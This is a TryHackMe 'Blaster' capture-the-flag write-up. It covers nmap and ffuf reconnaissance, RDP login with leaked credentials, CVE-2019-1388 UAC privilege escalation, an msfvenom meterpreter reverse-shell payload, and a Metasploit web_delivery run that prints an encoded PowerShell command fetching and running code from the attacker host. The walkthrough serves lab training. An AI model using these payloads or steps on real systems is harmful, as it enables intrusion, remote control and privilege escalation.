---
layout: page
title: Blaster
description: Discovered credentials and gained RDP access
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/blaster/logo.png" title="THM Blaster Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/blaster">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to take aim and take a shot at Blaster.

Run nmap to get a list of services running on top ports.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/thm/blaster]
└─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.168.212
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 01:29 AEDT
Nmap scan report for 10.10.168.212
Host is up (0.26s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2025-02-28T14:23:55
|_Not valid after:  2025-08-30T14:23:55
|_ssl-date: 2025-03-01T14:30:39+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2025-03-01T14:30:34+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (87%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   9.61 ms   10.4.0.1
2   ... 3
4   263.14 ms 10.10.168.212

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.75 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Check the landing page running on the webserver.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the FFUF to try and brute-force any interesting files and directories.

{% capture ffuf %}
┌──(kali㉿kali)-[~/Documents/thm/blaster]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.168.212/FUZZ -e .txt,.bak,.html -fs 703

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.168.212/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 703
________________________________________________

retro                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 343ms]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=ffuf %}

<br />
Check the /retro directory.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/retro.png" title="Retro Directory" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the posts and comments.  Hey!  A possible username and password.  Neato mosquito!

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/post.png" title="Posts and Comments" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
RDP with the credentials that we just found.

{% capture waderdp %}
┌──(kali㉿kali)-[~/Documents/thm/blaster]
└─$ xfreerdp /u:wade /p:parzival /v:10.10.168.212 /dynamic-resolution +clipboard
[01:41:12:070] [61693:61694] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:41:12:070] [61693:61694] [WARN][com.freerdp.crypto] - CN = RetroWeb
[01:41:12:071] [61693:61694] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:41:12:071] [61693:61694] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:41:12:071] [61693:61694] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:41:12:071] [61693:61694] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.168.212:3389) 
[01:41:12:071] [61693:61694] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:41:12:071] [61693:61694] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:41:12:071] [61693:61694] [ERROR][com.freerdp.crypto] -      RetroWeb
[01:41:12:071] [61693:61694] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.168.212:3389 (RDP-Server):
        Common Name: RetroWeb
        Subject:     CN = RetroWeb
        Issuer:      CN = RetroWeb
        Thumbprint:  58:0e:1d:1e:a2:6e:a2:1d:26:12:0a:bb:5b:b3:e6:5d:b8:f4:9d:55:6e:91:3f:73:ec:3d:34:2a:3c:14:72:54
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[01:41:20:659] [61693:61694] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[01:41:20:659] [61693:61694] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[01:41:20:690] [61693:61694] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[01:41:20:691] [61693:61694] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[01:41:20:691] [61693:61694] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[01:41:22:975] [61693:61694] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=waderdp %}

<br />
Get the user.txt flag.

{% capture userflag %}
C:\Users\Wade\Desktop>type user.txt.txt
<redacted>
C:\Users\Wade\Desktop>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::7da3:ae79:73ae:96ec%4
   IPv4 Address. . . . . . . . . . . : 10.10.168.212
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : 2001:0:2851:782c:3c05:344d:f5f5:572b
   Link-local IPv6 Address . . . . . : fe80::3c05:344d:f5f5:572b%3
   Default Gateway . . . . . . . . . : ::

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}

<br />
Check the Internet Explorer history.  Nothing.  Drats!

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/desktop.png" title="File on Desktop" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Google the file and notice the CVE that comes up immediately.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/google.png" title="Google It" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://sotharo-meas.medium.com/cve-2019-1388-windows-privilege-escalation-through-uac-22693fa23f5f">https://sotharo-meas.medium.com/cve-2019-1388-windows-privilege-escalation-through-uac-22693fa23f5f</a>

<br />
Right-click and click on Run as administrator.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/runas.png" title="Run as administrator" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
On the UAC, click on Show more details.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/moredetails.png" title="Show more details" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click Show information about the publisher's certificate.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/showinformation.png" title="Show more information" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on the VeriSign hyperlink in the Issue By line.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/issuedby.png" title="Click Issued By" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Back out of the UAC and back to the desktop.  Let the browser fully load.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/browser.png" title="Let Browser Load" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on File > Save As to save.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/saveas.png" title="Click on Save As" class="img-fluid rounded z-depth-1" %}
    </div>
</div>


<br />
Click on OK on the error that appears.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/clickok.png" title="Click OK" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
In the File name: box, type C:\Windows\system32\*.* and then press Enter.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/sys32.png" title="System32 Wildcard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Scroll down to the cmd.exe file, right-click on it, and click Open.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/overwrite.png" title="Overwrite cmd.exe" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Confirm that we are, in fact, system.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/systemcheck.png" title="System Check" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Get the root.txt flag.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/root.png" title="Get the root flag" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Use msfvenom to generate a meterpreter payload.

{% capture genmeterexe %}
┌──(kali㉿kali)-[~/Documents/thm/blaster]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.119.29 LPORT=4444 -f exe -o meter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: meter.exe
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/blaster]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=genmeterexe %}

<br />
Choose to use web_delivery exploit.

{% capture usewebdelivery %}
┌──(kali㉿kali)-[~/Documents/thm/blaster]
└─$ msfconsole -q                                                                               
msf6 > use exploit/multi/script/web_delivery
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=usewebdelivery %}

<br />
Show all of the available targets.

{% capture showtargets %}
msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Python
    1   PHP
    2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=showtargets %}

<br />
Set all of the options associated with the payload and then run as a job.

{% capture runmeterpowershellpayload %}
msf6 exploit(multi/script/web_delivery) > set lhost tun0
lhost => 10.4.119.29
msf6 exploit(multi/script/web_delivery) > set lhost tun0
lhost => 10.4.119.29
msf6 exploit(multi/script/web_delivery) > set lport 4445
lport => 4445
msf6 exploit(multi/script/web_delivery) > set TARGET 2
TARGET => 2
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started HTTP reverse handler on http://10.4.119.29:4445
[*] Using URL: http://10.4.119.29:8080/JM9EmKI6JTch
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB4AHoAMgBKAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHgAegAyAEoALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAB4AHoAMgBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANAAuADEAMQA5AC4AMgA5ADoAOAAwADgAMAAvAEoATQA5AEUAbQBLAEkANgBKAFQAYwBoAC8AagA2AHMAegAyAFEAbQBZAHoAdABqAGwAdgAwACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgA0AC4AMQAxADkALgAyADkAOgA4ADAAOAAwAC8ASgBNADkARQBtAEsASQA2AEoAVABjAGgAJwApACkAOwA=
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runmeterpowershellpayload %}

<br />
Execute the powershell command.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/blaster/execute.png" title="Execute" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the Meterpreter and catch the session.

{% capture catchmetersession %}
[*] 10.10.168.212    web_delivery - Delivering AMSI Bypass (1377 bytes)
[*] 10.10.168.212    web_delivery - Delivering Payload (4061 bytes)
[!] http://10.4.119.29:4445 handling request from 10.10.168.212; (UUID: e9c2agrp) Without a database connected that payload UUID tracking will not work!
[*] http://10.4.119.29:4445 handling request from 10.10.168.212; (UUID: e9c2agrp) Staging x86 payload (178780 bytes) ...
[!] http://10.4.119.29:4445 handling request from 10.10.168.212; (UUID: e9c2agrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.4.119.29:4445 -> 10.10.168.212:49864) at 2025-03-02 02:28:06 +1100
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchmetersession %}

<br />
Research meterpreter services for something that runs at startup.

<a href="https://www.offsec.com/metasploit-unleashed/meterpreter-service/">https://www.offsec.com/metasploit-unleashed/meterpreter-service/</a>

<br />
Drop into that session.

{% capture dropintosession1 %}
sessions

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ RETROWEB  10.4.119.29:4445 -> 10.10.168.212:49864 (10.10.168.212)

msf6 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=dropintosession1 %}

<br />
Try running the choice from the article.

{% capture runpersistence %}
meterpreter > run persistence -X
[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
[!] Example: run exploit/windows/local/persistence OPTION=value [...]
[-] The specified meterpreter session script could not be found: persistence
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runpersistence %}

<br />
And with that we blasted through another one.  Thanks for reading.  See you in the next one!